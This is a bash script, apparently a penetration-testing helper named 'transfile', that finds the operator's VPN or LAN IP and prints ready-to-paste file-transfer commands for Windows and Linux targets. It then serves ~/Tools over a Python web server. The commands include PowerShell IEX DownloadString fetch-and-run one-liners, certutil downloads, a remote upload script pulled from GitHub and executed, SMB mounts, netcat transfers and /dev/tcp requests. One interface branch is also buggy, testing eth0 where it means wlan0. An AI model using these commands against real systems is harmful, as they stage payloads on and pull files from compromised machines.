#!/bin/bash

# Define color variables from terminal settings
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
NC=$(tput sgr0) # No Color
bold=$(tput bold)
ul=$(tput smul)

if [ -n "$(ifconfig tun0)" ]; then
    ip=$(ifconfig tun0 | grep -E 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
elif [ -n "$(ifconfig eth0)" ]; then
    ip=$(ifconfig eth0 | grep -E 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
elif [ -n "$(ifconfig eth0)" ]; then
    ip=$(ifconfig wlan0 | grep -E 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
else
    echo "${RED}Error: Unable to retrieve IP address.${NC}"
    echo "Enter IP address:"
    read -r ip
fi

filename=${1:-"filename.txt"}
platform=$2
port=$3


if [ "$filename" = "-h" ]; then
    printf "${RED}Usage: ${NC}transfile filename platform port\n"
    printf "\n        (Optional) platform - w for windows or l for linux\n"
    printf "\n        (Optional) port on which web server is served"
    exit
fi

if [ "$platform" == "w" ]; then
printf "\n${RED}======================================WINDOWS======================================${NC}\n"
printf "\n${GREEN}\033[1m\033[4mPYTHON SERVER:\033[0m${NC}\n"
printf "\n${YELLOW}\033[4mDownload:\033[4m${NC}\n"
printf "\n${BLUE}PS Wget:${NC}\n"
printf "wget http://%s/%s\n\n" "$ip:$port" "$filename -o $filename"
printf "${BLUE}Curl:${NC}\n"
printf "curl http://$ip:$port/$filename -o $filename\n"
printf "\n${BLUE}Powershell(With saving):${NC}\n"
printf "powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://%s/%s', '$filename')\n\n" "$ip:$port" "$filename"
printf "${BLUE}Powershell(Without saving):${NC}\n"
printf "powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://%s/%s')\n" "$ip:$port" "$filename"
printf "\n${BLUE}Powershell(Without saving):${NC}\n"
printf "\n${BLUE}CMD:${NC}\n"
printf "certutil -urlcache -f http://$ip:$port/$filename $filename\n"

printf "\n${YELLOW}\033[4mUpload:\033[4m${NC}\n"
printf "\n${BLUE}PS Upload:${NC}\n"
printf "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')"
printf "Invoke-FileUpload -Uri http://$ip:$port/upload -File $filename"
echo " "
echo " "
printf "\n${GREEN}\033[1m\033[4mSMB SERVER:\033[0m${NC}\n"
printf "${BLUE}Copy files:  ${NC}"
printf "copy \\\\\\\\$ip\\\\share\\\\%s" "$filename"
printf "\n${BLUE}Mount disk:  ${NC}"
printf "net use n: \\\\\\\\$ip\share /user:test test\n"

elif [ "$platform" == "l" ]; then
printf "\n${RED}======================================LINUX======================================${NC}\n"
printf "${BLUE}Wget:${NC}\n"
printf "wget http://$ip:$port/$filename\n"

printf "\n${BLUE}Curl:${NC}\n"
printf "curl http://$ip:$port/$filename -o $filename\n"

printf "\n${BLUE}Netcat:${NC}\n"
echo "${ul}${bold}Sender:${NC} cat $filename | netcat $ip 1234"
echo "${ul}${bold}Receiver:${NC} nc -l -p 1234 -q 1 > $filename < /dev/null"

printf "\n${BLUE}Bash:${NC}\n"
printf "exec 3<>/dev/tcp/$ip/$port\n"
printf 'echo -e "GET /$filename HTTP/1.1\\n\\n">&3'
printf "\ncat <&3\n"
printf "\n${BLUE}SCP(SSH):${NC}\n"
printf "${ul}${bold}Sending:${NC}  scp $filename user@remotehost:/remote/path/\n"
printf "${ul}${bold}Receiving:${NC} scp remoteuser@remotehost:$filename archive" 

else
    "$0" "$1" "w"
    "$0" "$1" "l"
fi

cd ~/Tools
python3 -m http.server $port
